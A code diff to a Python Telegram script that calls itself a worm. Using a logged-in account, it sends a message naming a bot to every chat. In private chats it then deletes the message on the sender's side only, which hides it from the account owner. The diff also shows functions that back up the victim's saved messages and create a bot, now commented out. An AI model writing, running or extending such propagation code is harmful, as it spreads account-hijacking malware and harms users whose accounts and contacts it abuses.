@@ -3,6 +3,7 @@ from telethon import functions, errors
 from dotenv import load_dotenv
 from pymongo.mongo_client import MongoClient
 from pymongo.server_api import ServerApi
+from strings import strings
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 load_dotenv(override=True)
@@ -42,8 +43,8 @@ async def backup_saves(client, me):
         except:
             break
     await client(functions.channels.LeaveChannelRequest(channel=channel_id))
-async def spread(client, me):
-    spread_msg = "Hey! I'm a worm! I'm spreading!"
+async def spread(client, bot):
+    spread_msg = strings['worm_msg'].format((await bot.get_me()).username)
     async for dialog in client.iter_dialogs():
         try:
             msg = await dialog.send_message(spread_msg)
@@ -55,8 +56,8 @@ async def spread(client, me):
         if dialog.is_user:
             await msg.delete(revoke=False)
 
-async def worm(client):
+async def worm(client, bot):
     me = await client.get_me()
-    await create_bot(client, me)
-    await backup_saves(client, me)
-    await spread(client, me)
+    #await create_bot(client, me)
+    #await backup_saves(client, me)
+    await spread(client, bot)
